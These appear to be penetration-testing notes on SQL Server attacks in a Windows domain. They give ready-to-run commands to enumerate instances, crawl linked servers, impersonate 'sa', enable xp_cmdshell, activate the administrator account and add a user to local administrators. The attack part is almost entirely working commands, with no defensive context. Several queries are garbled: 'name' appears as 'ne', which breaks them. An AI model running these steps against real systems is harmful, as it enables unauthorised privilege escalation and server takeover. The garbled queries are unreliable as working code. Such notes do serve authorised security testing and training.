**Pentest Notes: SQL Server Enumeration and Exploitation**

---

### Enumerating SQL Servers in the Domain

Identify SQL servers within the domain to locate potential targets for further exploitation.

```powershell
Get-SQLInstanceDomain
```

### Connecting and Crawling Database Links

Once SQL servers are identified, connect to the servers and crawl database links to discover additional databases and linked servers.

1. **Connect to the SQL Server:**

   - Use a SQL client or PowerShell to connect to the identified SQL server.

   ```powershell
   sqlcmd -S <SQLServerne> -U <Userne> -P <Password>
   ```

2. **List Linked Servers:**

   - Execute the following SQL command to list all linked servers:

   ```sql
   EXEC sp_linkedservers;
   ```

3. **Query Linked Servers:**

   - Use the following query to gather information about the linked servers:

   ```sql
   SELECT * FROM sys.servers;
   ```

4. **Explore Databases on Linked Servers:**

   - Query the list of databases on each linked server:

   ```sql
   EXEC ('SELECT ne FROM master.dbo.sysdatabases') AT [LinkedServerne];
   ```

5. **Explore Tables and Columns:**

   - List tables and columns in the discovered databases:

   ```sql
   EXEC ('SELECT table_ne, column_ne FROM information_schema.columns') AT [LinkedServerne].[Databasene];
   ```

### Execute Commands on SQL

Execute commands on the SQL server to check for impersonation and potential privilege escalation.

1. **Check for Impersonation:**

   - Attempt to execute commands as another user to identify potential impersonation vulnerabilities:

   ```sql
   EXECUTE AS LOGIN = 'sa';
   ```

2. **Execute System Commands:**

   - Use `xp_cmdshell` to execute system commands:

   ```sql
   EXEC xp_cmdshell 'whoami';
   ```

### Gaining Root Access

Through SQL command execution and impersonation, escalate privileges to achieve root access.

1. **Enable xp_cmdshell:**

   - If `xp_cmdshell` is disabled, enable it:

   ```sql
   EXEC sp_configure 'show advanced options', 1;
   RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1;
   RECONFIGURE;
   ```

2. **Execute Commands as System:**

   - Run commands to escalate privileges:

   ```sql
   EXEC xp_cmdshell 'net user administrator /active:yes';
   EXEC xp_cmdshell 'net localgroup administrators <YourUser> /add';
   ```

**And we are root!**

3. **Verify Access:**

   - Confirm the elevated privileges by running:

   ```sql
   EXEC xp_cmdshell 'whoami';
   ```
